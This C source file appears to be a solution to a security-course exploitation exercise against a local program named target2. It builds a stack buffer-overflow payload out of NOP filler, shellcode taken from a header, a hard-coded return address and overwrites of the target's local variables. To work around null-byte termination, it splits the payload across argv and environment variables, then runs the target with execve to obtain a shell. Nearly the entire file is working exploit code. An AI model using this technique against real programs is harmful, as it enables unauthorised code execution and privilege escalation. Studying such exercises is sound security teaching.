#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"
#define NOP    '\x90'

// Overflow Buffer has a max length of 270 due to 0x00 needed to set local variable len
// Missing chars are made up using env variable 
#define OFBUFLENGTH 270


int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[3];

	char overflowBuf[OFBUFLENGTH];

	// Avoid null terminating char in the string 
	int shellcodeSize = sizeof(shellcode)-1;

	int i;
	char RPAddr[]="\x20\x21\xfd\x40";
	
	// Set everything to NOP, overwrite if the locations is useful
	for (i=0; i<OFBUFLENGTH; i++)
		overflowBuf[i] = NOP;
	
	// Insert shellcode to the begining of the buffer
	for(i=0; i < shellcodeSize; i++)
		overflowBuf[i] = shellcode[i];

	// Put return address somewhere nice (somewhere won't be in the way)
	int RPEndAddrInBuf = OFBUFLENGTH -1;
	for(i=0; i < 4; i++)
		overflowBuf[204-i] = RPAddr[i];

	// Local variable i, overwrite it to just jump to local variable len
	char iOverwrite[]="\x01\x0b";
	for(i=0; i < 2; i++)
		overflowBuf[265-i] = iOverwrite[i];

	// Local variable len, must overwrite it to 284 (0x0000011b)
	// However, 0x00 terminates argv[1]. Anything after the first 0x00 becomes garbage 
	// Solution: write the first 0x00 in the buffer (argv[1]), write the next 0x00 and 
	// the rest of the overflow code in env variables. Access them consecutively as a signle piece of memory  
	// Note: where argv and env are located in memeory
	//      <strings><argv pointers>NULL<envp pointers>NULL<argc><argv><envp>
	//									^	^
	//									|	|	
	char lenOverwrite[]="\x00\x01\x1b";
	for(i=0; i < 3; i++)
		overflowBuf[270-i] = lenOverwrite[i];
	
	args[0] = TARGET;
	args[1] = overflowBuf;
	args[2] = NULL;

	env[0] = &overflowBuf[270];
	env[1] = &overflowBuf[193];
	env[2] = NULL;
	
	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
